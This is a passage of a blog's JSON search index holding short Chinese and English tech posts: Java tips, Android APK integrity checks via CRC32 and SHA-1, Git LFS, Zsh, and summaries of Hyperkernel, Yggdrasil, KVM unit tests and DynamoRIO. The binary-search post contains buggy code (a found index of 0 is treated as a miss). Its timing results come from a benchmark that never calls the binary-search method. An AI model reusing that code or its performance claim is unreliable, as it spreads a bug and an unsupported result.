欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"},{"name":"String","slug":"Java开发Tips/String","permalink":"http://www.meng.uno/categories/Java开发Tips/String/"},{"name":"Object","slug":"Java开发Tips/String/Object","permalink":"http://www.meng.uno/categories/Java开发Tips/String/Object/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"}]},{"title":"Java异常结构层次图","slug":"java-exceptions-hierarchy","date":"2018-02-09T14:11:15.000Z","updated":"2018-02-10T14:51:35.021Z","comments":true,"path":"articles/1164dab2/","link":"","permalink":"http://www.meng.uno/articles/1164dab2/","excerpt":"在Java中，异常分为checked与unchecked，他们都在一个分类层次中，如下图。 其中，红色的异常是checked异常，意味着在一个方法中，他们throw后必须catch或者declare。 另一种颜色的为unchecked异常，他们的异常不需要被recover。 本文链接： http://www.meng.uno/articles/1164dab2/ 欢迎转载！","text":"在Java中，异常分为checked与unchecked，他们都在一个分类层次中，如下图。 其中，红色的异常是checked异常，意味着在一个方法中，他们throw后必须catch或者declare。 另一种颜色的为unchecked异常，他们的异常不需要被recover。 本文链接： http://www.meng.uno/articles/1164dab2/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"},{"name":"Exception","slug":"Java开发Tips/Exception","permalink":"http://www.meng.uno/categories/Java开发Tips/Exception/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"Exception","slug":"Exception","permalink":"http://www.meng.uno/tags/Exception/"}]},{"title":"二分查找的效率","slug":"binsearch","date":"2018-02-08T09:20:00.000Z","updated":"2018-02-10T13:05:27.172Z","comments":true,"path":"articles/fff444e8/","link":"","permalink":"http://www.meng.uno/articles/fff444e8/","excerpt":"查找是比较常见的工作，今天我通过对比几种在数组中查找一个确定的值的例子来向大家展示二分查找的魅力。 数组查找元素的几种方法 使用List 1 2 3 public static boolean useList(String[] arr, String targetValue) { return Arrays.asList(arr).contains(targetValue); } 使用Set 1 2 3 4 public static boolean useSet(String[] arr, String targetValue) { Set set = ne","text":"查找是比较常见的工作，今天我通过对比几种在数组中查找一个确定的值的例子来向大家展示二分查找的魅力。 数组查找元素的几种方法 使用List 123 public static boolean useList(String[] arr, String targetValue) &#123; return Arrays.asList(arr).contains(targetValue);&#125; 使用Set 1234 public static boolean useSet(String[] arr, String targetValue) &#123; Set&lt;String&gt; set = new HashSet&lt;String&gt;(Arrays.asList(arr)); return set.contains(targetValue);&#125; 使用for-loop 1234567 public static boolean useLoop(String[] arr, String targetValue) &#123; for(String s: arr)&#123; if(s.equals(targetValue)) return true; &#125; return false;&#125; 使用二分 1234567 public static boolean useArraysBinarySearch(String[] arr, String targetValue) &#123; int a = Arrays.binarySearch(arr, targetValue); if(a &gt; 0) return true; else return false;&#125; 时间复杂性 代码 使用如下代码来验证不同数据规模（5，1k，10k）的查找任务下四种方法的时间复杂性。（二分查找需要对数据排序，排序时间未计算在内。） 123456789101112131415161718192021222324252627282930 public static void main(String[] args) &#123; String[] arr = new String[] &#123; \"CD\", \"BC\", \"EF\", \"DE\", \"AB\"&#125;; //use list long startTime = System.nanoTime(); for (int i = 0; i &lt; 100000; i++) &#123; useList(arr, \"A\"); &#125; long endTime = System.nanoTime(); long duration = endTime - startTime; System.out.println(\"useList: \" + duration / 1000000); //use set startTime = System.nanoTime(); for (int i = 0; i &lt; 100000; i++) &#123; useSet(arr, \"A\"); &#125; endTime = System.nanoTime(); duration = endTime - startTime; System.out.println(\"useSet: \" + duration / 1000000); //use loop startTime = System.nanoTime(); for (int i = 0; i &lt; 100000; i++) &#123; useLoop(arr, \"A\"); &#125; endTime = System.nanoTime(); duration = endTime - startTime; System.out.println(\"useLoop: \" + duration / 1000000);&#125; &quot;5&quot;结果 123 useList: 13useSet: 72useLoop: 5 &quot;1k&quot;结果 随机生成数据 123456 String[] arr = new String[1000]; Random s = new Random();for(int i=0; i&lt; 1000; i++)&#123; arr[i] = String.valueOf(s.nextInt());&#125; 结果 1234 useList: 112useSet: 2055useLoop: 99useArrayBinary: 12 &quot;10k&quot;结果 1234 useList: 1590useSet: 23819useLoop: 1526useArrayBinary: 12 结论 通过以上结果，我们可以发现二分搜索确实很高效，而且当数据量变大时，其时间增长幅度还比较小。 以后，我们就可以使用Arrays.binarySearch()来高效查找某元素了。 本文链接： http://www.meng.uno/articles/fff444e8/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"},{"name":"Search","slug":"Java开发Tips/Search","permalink":"http://www.meng.uno/categories/Java开发Tips/Search/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"算法复杂性","slug":"算法复杂性","permalink":"http://www.meng.uno/tags/算法复杂性/"},{"name":"二分查找","slug":"二分查找","permalink":"http://www.meng.uno/tags/二分查找/"}]},{"title":"Java Substring() 的实现","slug":"substring","date":"2018-02-08T07:43:08.000Z","updated":"2018-03-02T03:26:32.958Z","comments":true,"path":"articles/f3057e6c/","link":"","permalink":"http://www.meng.uno/articles/f3057e6c/","excerpt":"写过Java的人应该都用过substring(int bedinIndex, int endIndex)方法。我发现这个简单的方法在实现上居然经过了一次大的变革。 substring()的用途 代码: 1 2 3 String origin = \"asdfg\"; origin = origin.substring(1,3); System.out.println(origin); 输出: 1 sd 我们发现它能将原始字符串中从下标为beginIndex到endIndex-1之间的子串取出。那它是怎么实现的呢？ substring()的实现 Java中的字符串有三个域：","text":"写过Java的人应该都用过substring(int bedinIndex, int endIndex)方法。我发现这个简单的方法在实现上居然经过了一次大的变革。 substring()的用途 代码: 123 String origin = \"asdfg\"; origin = origin.substring(1,3);System.out.println(origin); 输出: 1 sd 我们发现它能将原始字符串中从下标为beginIndex到endIndex-1之间的子串取出。那它是怎么实现的呢？ substring()的实现 Java中的字符串有三个域：char value[], int offset以及int count，它们分别存储字符串的值，起始下标与长度。 JDK6版本 在这个版本中，每次执行substring()方法时并不会新建新的string，仅仅只是将上述三个域中的offset，count做必要的修改。返回对象仍指向原来的数据。 这样一来，缺点就比较明显：当原始字符串比较长，而截取的子串比较短时，在后续的使用中就会浪费大量的空间。 JDK7+版本 在上一个版本基础上，这个方法进行了改进，每次使用这个方法都会新建一个string对象，并将其返回。 本文链接： http://www.meng.uno/articles/f3057e6c/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"}]},{"title":"Android安全之apk完整性校检","slug":"android-safty","date":"2018-02-04T06:08:38.000Z","updated":"2018-04-04T06:32:50.683Z","comments":true,"path":"articles/9b5f779d/","link":"","permalink":"http://www.meng.uno/articles/9b5f779d/","excerpt":"crc32 全称是“Cyclic Redundancy Check”，中文名是“循环冗余码”。 它的计算是非常非常非常严格的。严格到什么程度呢？你的程序只要被改动了一个字节（甚至只是大小写的改动），它的值就会跟原来的不同。 在apk中，反编译后恶意的篡改代码重新打包主要集中在dex文件中，所以可以通过获取dex文件的crc32值来观察dex文件是否被篡改过了。代码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /** * 获取当前apk的crc32值 * @return */ public static Long getCrc32(Contex","text":"crc32 全称是“Cyclic Redundancy Check”，中文名是“循环冗余码”。 它的计算是非常非常非常严格的。严格到什么程度呢？你的程序只要被改动了一个字节（甚至只是大小写的改动），它的值就会跟原来的不同。 在apk中，反编译后恶意的篡改代码重新打包主要集中在dex文件中，所以可以通过获取dex文件的crc32值来观察dex文件是否被篡改过了。代码： 12345678910111213141516 /** * 获取当前apk的crc32值 * @return */public static Long getCrc32(Context context)&#123; String apkPath = ApkPathUtils.getApkPath(context); ZipFile zipfile = null; ZipEntry dexentry = null; try &#123; zipfile = new ZipFile(apkPath); dexentry = zipfile.getEntry(&quot;classes.dex&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return dexentry.getCrc();&#125; 上文代码中的工具类ApkPathUtils： 12345678910111213 public class ApkPathUtils &#123; public static String getApkPath(Context context)&#123; try &#123; PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(),PackageManager.GET_META_DATA); ApplicationInfo applicationInfo = packageInfo.applicationInfo; return applicationInfo.publicSourceDir; // 获取当前apk包的绝对路径 &#125; catch (PackageManager.NameNotFoundException e) &#123; e.printStackTrace(); &#125; return &quot;&quot;; &#125;&#125; 看getCrc32(Context context)这个方法，只是给ZipFile这类塞了一个当前apk包的绝对路径就可以了，而这个当前apk的绝对路径可以通过PackageInfo拿到，记得加上读外部存储卡的权限。当然，5.0以后的权限另做处理。 获取到crc32值之后一般有两种处理方式： 把crc32值放在本地的string.xml文件中，在运行时获取比对，如果与.xml获取到的crc32值不同，则说明代码有变动，则apk已经被修改。注意：不要放在raw，asset中的文件。只有不牵扯javad代码的修改，放在本地的任意位置都行。 将获取到的crc32值加密送到后台，解密与后台保存的crc32值进行比对。通过接口获取比对结果，判断apk是否被修改过。 注意：校验的代码最好加上版本的判断，只有在release版本的时候才会去校验，debug模式的时候不做判断，因为在debug模式的时候也判断的话，你就没法调试代码了，永远在修改，获取到的值永远不同 apk Hash值判断 MD5Hash算法的”数字指纹”特性，使它成为目前应用最广泛的一种文件完整性校验。 先看校验方法： 123456789101112131415161718192021222324252627282930 /** * 获取当前apk包的hash值 * @return */public String getHash(Context context)&#123; MessageDigest msgDigest = null; String apkPath = ApkPathUtils.getApkPath(context); FileInputStream fis = null; try &#123; msgDigest = MessageDigest.getInstance(&quot;SHA-1&quot;); byte[] bytes = new byte[1024]; int byteCount; fis= new FileInputStream(new File(apkPath)); while ((byteCount = fis.read(bytes)) &gt; 0) &#123; msgDigest.update(bytes, 0, byteCount); &#125; BigInteger bi = new BigInteger(1, msgDigest.digest()); return bi.toString(16); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;finally &#123; try &#123; fis.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; return &quot;&quot;;&#125; 从上面代码可以看出，就是对apk文件的流进行了sha-1，并转成16进制，获取到的hash值。 与 DEX 校验不同 APK 检验必须把把计算好的 Hash 值放在网络服务端，因为对 APK 的任何改动都会影响到最后的 Hash 值。 当你获取到hash值后放在本地，这时候apk的hash值已经改变，所以你永远获取不到一个准确版本的hash值，所以获取后只能放在服务端进行校验，校验的方式与crc32在服务端的校验是相同的，不再赘述。 crc32,apk-hash值都可以通过dos命令行获取。 当然上述的保护方式容易被暴力破解, 完整性检查最终还是通过返回 true/false 来控制后续代码逻辑的走向,如果攻击者直接修改代码逻辑,完整性检查始终返回 true,那这种方法就无效了当然你可以把校验逻辑放进.so文件，加大破解的难度。但还是不能完全保证安全，而且遇到apk动态加载，会自动创建dex文件的情况，或者应用加固. 本文链接： http://www.meng.uno/articles/9b5f779d/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/tags/Android/"},{"name":"Safty","slug":"Safty","permalink":"http://www.meng.uno/tags/Safty/"},{"name":"apk","slug":"apk","permalink":"http://www.meng.uno/tags/apk/"}]},{"title":"Java异常处理","slug":"java-exceptions-work","date":"2018-02-01T14:21:52.000Z","updated":"2018-02-10T14:51:35.019Z","comments":true,"path":"articles/7526d370/","link":"","permalink":"http://www.meng.uno/articles/7526d370/","excerpt":"在Java中，调用某方法，就必须处理被调用方法抛出的异常，同时超类也可以用来捕获或者处理子类异常。 调用方法必须处理被调用方法抛出的异常 下面是一个处理异常的程序。我们可以测试一下，如果在一个方法中抛出一个异常，不仅是该方法，而且所有调用该方法的方法都必须声明或抛出异常。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class exceptionTest { private static Exception exception; public static void main(String[] args) throws Ex","text":"在Java中，调用某方法，就必须处理被调用方法抛出的异常，同时超类也可以用来捕获或者处理子类异常。 调用方法必须处理被调用方法抛出的异常 下面是一个处理异常的程序。我们可以测试一下，如果在一个方法中抛出一个异常，不仅是该方法，而且所有调用该方法的方法都必须声明或抛出异常。 123456789101112131415 public class exceptionTest &#123; private static Exception exception; public static void main(String[] args) throws Exception &#123; callDoOne(); &#125; public static void doOne() throws Exception &#123; throw exception; &#125; public static void callDoOne() throws Exception &#123; doOne(); &#125;&#125; 超类可以用来捕获或处理子类异常 可以使用如下代码验证。 123456789101112131415161718192021 class myException extends Exception&#123; &#125; public class exceptionTest &#123; private static Exception exception; private static myException myexception; public static void main(String[] args) throws Exception &#123; callDoOne(); &#125; public static void doOne() throws myException &#123; throw myexception; &#125; public static void callDoOne() throws Exception &#123; doOne(); throw exception; &#125;&#125; 这也就是为什么catch子句只有一个父类在语法上安全的原因。 本文链接： http://www.meng.uno/articles/7526d370/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"},{"name":"Exception","slug":"Java开发Tips/Exception","permalink":"http://www.meng.uno/categories/Java开发Tips/Exception/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"Exception","slug":"Exception","permalink":"http://www.meng.uno/tags/Exception/"}]},{"title":"Analysis For Hyperkernel","slug":"hv6","date":"2018-01-29T13:43:03.000Z","updated":"2018-02-10T14:56:55.140Z","comments":true,"path":"articles/55c9299d/","link":"","permalink":"http://www.meng.uno/articles/55c9299d/","excerpt":"Homepage: https://locore.cs.washington.edu/hyperkernel/ Code: https://github.com/locore/hv6 State-machine Specification State-machine specification means the system function will first verify the old procedure until the procedure is runnable and then return a new procedure and write to the system i","text":"Homepage: https://locore.cs.washington.edu/hyperkernel/ Code: https://github.com/locore/hv6 State-machine Specification State-machine specification means the system function will first verify the old procedure until the procedure is runnable and then return a new procedure and write to the system image. All of these must run in the user level. This specification consists of two parts: a definition of abstract kernel state, and a definition of trap handlers (e.g., system calls) in terms of abstract state transitions. They use fully automated technique to find bugs and this method is full functional verification if program is free of loops and state is finite. The “hv6/hv6/spec/kernel/spec/specs.py” file contains the system calls which use this kind of specification. From the picture, we can see that they use Z3 to prove the correction of the “old” procedure and if it can transfer to a new state or it is runnable, it will return the new procedure so that it can be proved true. Declarative Specification The authors also provide a declarative specification of the high level properties that the state-machine specification should satisfy. The verifier will check that these high level properties are indeed satisfied, helping increase the programmer’s confidence in the correctness of the state-machine specification. To improve confidence in its correctness, there is a higher-level declarative specification to better capture programmer intuition about kernel behavior, in the form of a conjunction of crosscutting properties that hold across all trap handlers. 本文链接： http://www.meng.uno/articles/55c9299d/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"},{"name":"系统验证","slug":"操作系统/系统验证","permalink":"http://www.meng.uno/categories/操作系统/系统验证/"}],"tags":[{"name":"System","slug":"System","permalink":"http://www.meng.uno/tags/System/"},{"name":"Verification","slug":"Verification","permalink":"http://www.meng.uno/tags/Verification/"}]},{"title":"怎么处理噪声","slug":"handle-noise","date":"2018-01-27T14:35:33.000Z","updated":"2018-02-17T02:10:40.282Z","comments":true,"path":"articles/a12d1477/","link":"","permalink":"http://www.meng.uno/articles/a12d1477/","excerpt":"处理噪声是一个在机器学习学习过程中，总会被问到的问题。噪声可以出现在输入X，亦可以出现在输出Y中。 X中缺失值 1. 使用来自所有可用数据的特征的平均值 2. 忽略实例 3. 使用来自类似项目的平均值 4. 使用另一个机器学习算法来预测值 * Bagging 或者 Boosting 本文链接： http://www.meng.uno/articles/a12d1477/ 欢迎转载！","text":"处理噪声是一个在机器学习学习过程中，总会被问到的问题。噪声可以出现在输入X，亦可以出现在输出Y中。 X中缺失值 使用来自所有可用数据的特征的平均值 忽略实例 使用来自类似项目的平均值 使用另一个机器学习算法来预测值 Bagging 或者 Boosting 本文链接： http://www.meng.uno/articles/a12d1477/ 欢迎转载！","categories":[{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/categories/AI/"},{"name":"机器学习","slug":"AI/机器学习","permalink":"http://www.meng.uno/categories/AI/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://www.meng.uno/tags/机器学习/"},{"name":"噪声","slug":"噪声","permalink":"http://www.meng.uno/tags/噪声/"}]},{"title":"Git Large File Storage","slug":"git-lfs","date":"2018-01-21T02:22:44.000Z","updated":"2018-03-20T07:33:19.942Z","comments":true,"path":"articles/c7ef6efe/","link":"","permalink":"http://www.meng.uno/articles/c7ef6efe/","excerpt":"基本没有什么人不知道Git了吧，也没有多少人不知道GitHub，但是谈到GitHub如何存储大文件（100MB以上），又有多少人知道呢？ 今天，我要给大家介绍一种，不用分割文件即可实现让GitHub存储我们的大文件的方案 —— Git Large File Storage。 首先，给出官网：Git Large File Storage。 使用方法： 1. 下载并安装：（Mac下：brew install git-lfs） 2. 进入Git仓库，安装lfs：git lfs install 3. 设置要跟踪的大文件：git lfs track \"*.file\" 4. 添加.gita","text":"基本没有什么人不知道Git了吧，也没有多少人不知道GitHub，但是谈到GitHub如何存储大文件（100MB以上），又有多少人知道呢？ 今天，我要给大家介绍一种，不用分割文件即可实现让GitHub存储我们的大文件的方案 —— Git Large File Storage。 首先，给出官网：Git Large File Storage。 使用方法： 下载并安装：（Mac下：brew install git-lfs） 进入Git仓库，安装lfs：git lfs install 设置要跟踪的大文件：git lfs track &quot;*.file&quot; 添加.gitattributes进Git仓库：git add .gitattributes 正常的Git提交到GitHub！ 其业务逻辑： 本文链接： http://www.meng.uno/articles/c7ef6efe/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"git","slug":"git","permalink":"http://www.meng.uno/tags/git/"},{"name":"超大文件","slug":"超大文件","permalink":"http://www.meng.uno/tags/超大文件/"},{"name":"GitHub","slug":"GitHub","permalink":"http://www.meng.uno/tags/GitHub/"}]},{"title":"Analysis for Yggdrasil","slug":"yggdrasil","date":"2018-01-16T14:31:00.000Z","updated":"2018-02-11T14:48:52.840Z","comments":true,"path":"articles/5ed9f695/","link":"","permalink":"http://www.meng.uno/articles/5ed9f695/","excerpt":"Yggdrasil is a toolkit for verifying file system with push-button verification via crash refinement. As for push-button verification, it means that Yggdrasil needs no manual annotations or proofs. As for crash refinement, it is amenable to fully automated SMT reasoning. The whole verification is som","text":"Yggdrasil is a toolkit for verifying file system with push-button verification via crash refinement. As for push-button verification, it means that Yggdrasil needs no manual annotations or proofs. As for crash refinement, it is amenable to fully automated SMT reasoning. The whole verification is something like the State-Machine Specification in the project “Hyperkernel”. The whole system architecture is shown as follows. From this picture, we know that Yggdrasil needs three inputs: a specification of the expected behavior, an implementation and consistency invariants which indicate whether a file system image is in a consistent state or not. For better run-time performance, Yggdrasil optionally performs optimizations. If there is a bug, Yggdrasil produces a counterexample to help identify and fix the cause. It requires no manual annotations or proofs about the implementation code. Once the verification passes, Yggdrasil emits C code, which is then compiled and linked using a C compiler to produce an executable file system, as well as a “fsck” checker. The above is the entire overall content of this project. The authors also introduced every part of this project. I will analyze it by following the paper. Single-level File System (YminLFS) In this project, every file system must contain three parts: an abstract data structure, a set of operations and a state equivalence predicate which defines whether a given implementation satisfies the specification. So the authors first defines a file system which contains these features. Then it runs the verification. Yggdrasil uses the Z3 solver to prove a two-part crash refinement. The first part deals with crash-free executions which requires the implementation and specification are similar in the absence of crashes, which means if both YminLFS and FSSpec start in equivalent and consistent states, they end up in equivalent and consistent states (just like state-machine). This project defines equivalence using the equivalent predicate and defines consistency using the consistency invariants as the above pictures show. The second part deals with crash executions which requires the implementation to exist no more crash states than the specification, which means each possible state of the YminLFS implementation must be equivalent to some crash state of FSSpec. What’s more, Yggdrasil provides a greedy optimizer that tries to remove every disk flush and re-verify the code. Multi-level File System (Yxv6) We could directly prove crash refinement between the entire file system specification and implementation in a single-level file system, however, we couldn’t use the same method in a complex multi-level file system. First, let’s look at the structure of Yxv6 journaling file system. This is the 5 layers of abstraction and every layer contains a specification and a implementation. The authors use this project to prove crash refinement for each layer and upper layers then use the specifications of lower layers. The lowest layer of the stack is a specification of an asynchronous disk. This specification comprises the asynchronous disk model which is to implement YminLFS. Application-level (“Ycp”) Ycp has a formal specification which means if the copy operation succeeds, the result is the same as “cp”, however, if it fails, the file system is unchanged. To achieve this propose, the implementation of Ycp is something similar to Yxv6 file system specification. There are 3 atomicity patterns which are “create a temporary file”, “write the source data to it” and “rename it to atomically create the target file”. After doing such an analogy, verifying this operation is similar to verify the single-level file system. 本文链接： http://www.meng.uno/articles/5ed9f695/ 欢迎转载！","categories":[{"name":"System Verification","slug":"System-Verification","permalink":"http://www.meng.uno/categories/System-Verification/"},{"name":"Yggdrasil","slug":"System-Verification/Yggdrasil","permalink":"http://www.meng.uno/categories/System-Verification/Yggdrasil/"}],"tags":[{"name":"Yggdrasil","slug":"Yggdrasil","permalink":"http://www.meng.uno/tags/Yggdrasil/"},{"name":"System Verification","slug":"System-Verification","permalink":"http://www.meng.uno/tags/System-Verification/"}]},{"title":"KVM Unit Tests","slug":"kvm-unit-test","date":"2018-01-15T14:19:40.000Z","updated":"2018-02-11T14:48:52.840Z","comments":true,"path":"articles/50351d5d/","link":"","permalink":"http://www.meng.uno/articles/50351d5d/","excerpt":"Kernel-based Virtual Machine (KVM) is a virtualization infrastructure for the Linux kernel that turns it into a hypervisor. KVM requires a processor with hardware virtualization extensions. This project, as its name suggests, is to provide unit tests for KVM. The unit tests are tiny guest operating","text":"Kernel-based Virtual Machine (KVM) is a virtualization infrastructure for the Linux kernel that turns it into a hypervisor. KVM requires a processor with hardware virtualization extensions. This project, as its name suggests, is to provide unit tests for KVM. The unit tests are tiny guest operating systems that generally execute only tens of lines of C and assembler test code in order to obtain its PASS/FAIL/SKIP result. Unit tests provide KVM and virtual hardware functional testing by targeting the features through minimal implementations of their use per the hardware specification. The simplicity of unit tests make them easy to verify they are correct, easy to maintain, and easy to use in timing measurements. Unit tests are also often used for quick and dirty bug reproducers. Build and Run Building this project is very easy, we just need to enter the directory and run “./configure; make”. If there isn’t any mistake, it means this project is successfully built. As can be seen from its name, it is a testing program so running it means running some tests on KVM. In addition, as other verification systems, it also has some single test cases and a whole test suite. What has to be aware is we need to install “kvm” or “qemu-kvm” before testing, otherwise, the tests will just “SKIP” because it is just for testing KVM. First, I will run a single test case which is in the “x86/” directory named “syscall.flat”. The result is as follows. Then, I will run a test suite. The following picture is part of the result. I found that there are 3 status of the test results which are PASS, FAIL and SKIP. From the picture, we can see that not all tests are PASS, which means this version of KVM may have many points to be improved. Analyze the Test To write a test case/suite, we first need to analyze an example. From the file “run_tests.sh”, we could find that it runs each test in “x86/unittests.cfg”. This is a section of this file. From it, we could know that when the test suite runs to here, it will find test case “apic.flat” and run it in the x86_64 architecture within 30 seconds. The result of every test case is printed to the screen by the “runtime.bash” script. What’s more, we could find the detailed information of every test case from “logs/” directory. After analyzing a test suite, let’s look at a single test case. I will choose the “syscall.flat” as an example. Let’s see the main function. There are two subfunctions which is consistent with the first screenshot. Now I will focus on a single function as the following picture shows. It just tests some single function calls and report the results. Write A Test Because I can’t know about KVM clearly for such a short period of time, here I just write a simple test, in order to experience how to write a test case. After compiling and running it, we could get this expected output. Now I could put my test case to the test suite, adding such code to the “unittests.cfg” file. Also, it must be PASS as expected. Analyze the Framework In the beginning, let’s analyze the directory structure. ./api/: there are three API categories 1) libc, 2) functions typical of kernel code, and 3) kvm-unit-tests specific. ./lib/: general architecture neutral services for the tests. ./x86/: the sources of the tests and the created images of X86 architecture. ./logs/: the output information. ./scripts/: helper scripts for building and running tests. others: configure script, top-level Makefile, and run_tests.sh. The framework has the following components: Test building support Shared code for test setup and API Test running support Test building is done through makefiles and some supporting bash scripts. Test setup code includes, for example, early system init, MMU enablement, and UART init. The API provides some common libc functions, as well as some low-level helper functions commonly seen in kernel code and some kvm-unit-tests specific APIs. Test running is provided with a few bash scripts, using a unit tests configuration file as input. Generally tests are run from within the source root directory using the supporting scripts, but tests may optionally be built as standalone tests as well. 本文链接： http://www.meng.uno/articles/50351d5d/ 欢迎转载！","categories":[{"name":"KVM","slug":"KVM","permalink":"http://www.meng.uno/categories/KVM/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://www.meng.uno/tags/KVM/"}]},{"title":"Analysis for DynamoRIO","slug":"rio","date":"2018-01-13T13:57:16.000Z","updated":"2018-02-11T14:04:49.152Z","comments":true,"path":"articles/a331aaad/","link":"","permalink":"http://www.meng.uno/articles/a331aaad/","excerpt":"DynamoRIO is a dynamic binary piling/translation platform. Through it, you can manipulate the running code of a program, that is, it can simulate running a program and allow you to transform and control any place of the running code. It is used for dynamic analysis, optimization and translation of p","text":"DynamoRIO is a dynamic binary piling/translation platform. Through it, you can manipulate the running code of a program, that is, it can simulate running a program and allow you to transform and control any place of the running code. It is used for dynamic analysis, optimization and translation of programs. DynamoRIO is a cooperation project between HP and MIT. Dynamo comes from HP’s laboratory, RIO (Runtime Introspection and Optimization) comes from MIT’s computer science laboratory. The history is shown as follows. Architecture DynamoRIO’s architecture is like this. It is between the operating system and the application so that it can get the system calls and the applications’ code easily. This picture is the Toolchain Control Points. The process flow is as follows. The original program goes through the “basic block builder”, “trace selector”, “basic block cache” and “trace cache” to get the emulation propose. Efficiency DynamoRIO is separated from the code of applications by the “context switch” as shown in the picture above. The applications’ code is copied to the instruction cache. The code in these caches will execute as native code. Until a jump instruction is encountered, the applications’ “machine state” will be saved, and the control will turn back to DynamoRIO to find the basic block where the jump instruction is located. DynamoRIO is much faster than pure emulations by “code cache”. There are several improvements in this project. The picture above is the first one — Basic Block Cache. If you copy each basic block into a code cache and run it natively, it greatly reduces the overhead of interpreting, however, we still need to explain each jump instruction, and then return to DynamoRIO to find the target instruction. If a target instruction already exists in the code cache and is referred to by a direct jump instruction, DynamoRIO can directly jump to the target instruction in the code cache to avoid the overhead of the context switch, which is called “Linking Direct Branches”. The next improvement is “Linking Indirect Branches” since a conditional branch instruction can not be linked like a direct jump instruction because it has more than one goal and needs to make decisions and find the list’s jump target. Some basic blocks, which are often executed sequentially, are combined into one execution stream to reduce the number of branches and increase the locality of the program. It reduces some overhead of indirect branch search, because it has put indirect brach in this trace as well. This is also the last improvement — Trace Building. Transparency It has three transparency principles which are “As few changes as possible”, “Hide necessary changes” and “Separate resources”. Changes in these areas are few: application code, stored addresses, threads and application data. Changes in these fields are hidden: application addresses, address space, error transparency and code cache consistency. This picture shows the principle 3 well. DynamoRIO’s own code also uses share libraries when loading applications, which may cause some conflicts if the application also uses the same library. The solution is that, DynamoRIO doesn’t use the library directly, calling system call on Linux and calling system call via windows win32 API profile. The heap memory allocated by DynamoRIO itself is distinguished from the heap memory requested by the application. In addition, DynamoRIO uses its own I/O routines for input and output to avoid conflicts with the applications’ I/O buffers. What’s more, since the use of shared locks can also cause conflicts between DynamoRIO and applications, it also has synchronization transparency. To avoid conflicts with applications, DynamoRIO doesn’t create its own thread, instead spawns threads in the application process to distinguish between its own status and applications’ status via a “Context Switch” as the first picture shows. Further more, it chooses to leave the stack of application processes intact, creating a private stack of each thread. Comprehensive All data streams must go through handlers generated by the dispatcher. The data flow is like this. Customization DynamoRIO has developed some event driven APIs that allow developers to customize instrument instructions. Using it, you can achieve some proposes such as: memory checking, performance testing, system call tracking, code coverage calculation. 本文链接： http://www.meng.uno/articles/a331aaad/ 欢迎转载！","categories":[{"name":"RIO","slug":"RIO","permalink":"http://www.meng.uno/categories/RIO/"},{"name":"DynamoRIO","slug":"RIO/DynamoRIO","permalink":"http://www.meng.uno/categories/RIO/DynamoRIO/"}],"tags":[{"name":"DynamoRIO","slug":"DynamoRIO","permalink":"http://www.meng.uno/tags/DynamoRIO/"},{"name":"RIO","slug":"RIO","permalink":"http://www.meng.uno/tags/RIO/"}]},{"title":"Zsh","slug":"zsh","date":"2018-01-11T02:22:44.000Z","updated":"2018-02-11T03:08:26.198Z","comments":true,"path":"articles/d911b12b/","link":"","permalink":"http://www.meng.uno/articles/d911b12b/","excerpt":"不少程序员都觉得Mac的一大优势就是其Shell，也有很多人觉得Mac与Linux在Shell上很相似。不错，但是Mac还是略胜一筹或者说高一个量级。今天，我将向大家介绍一个Mac特有的Shell（Linux也可以安装，但是不是系统自带。）—— Zsh。 切换到Zsh 使用cat /etc/shells指令，我们可以看看自己的系统有哪些Shells，下面是我的Mac的结果： 1 2 3 4 5 6 7 /bin/bash /bin/csh /bin/ksh /bin/sh /bin/tcsh /bin/zsh /usr/local/bin/fish 使用这个指令切换到Zsh：chs","text":"不少程序员都觉得Mac的一大优势就是其Shell，也有很多人觉得Mac与Linux在Shell上很相似。不错，但是Mac还是略胜一筹或者说高一个量级。今天，我将向大家介绍一个Mac特有的Shell（Linux也可以安装，但是不是系统自带。）—— Zsh。 切换到Zsh 使用cat /etc/shells指令，我们可以看看自己的系统有哪些Shells，下面是我的Mac的结果： 1234567 /bin/bash/bin/csh/bin/ksh/bin/sh/bin/tcsh/bin/zsh/usr/local/bin/fish 使用这个指令切换到Zsh：chsh -s /bin/zsh。（想使用其他Shell也是同样的指令哦。） 这是，我们的Shell配置文件就为.zshrc了。 我觉得从这里我们应该可以知道，为什么之前的Shell配置文件要以.bash_profile命名了吧。因为Mac默认Shell是Bash。 迁移Bash配置 我使用Bash有好几年了，那些配置都是一些环境变量啊什么的，如果在Zsh的配置里再写一遍，无疑是一件很费时又低效的事。那有没有什么快捷的方式呢？当然有！ 通过如下指令：source 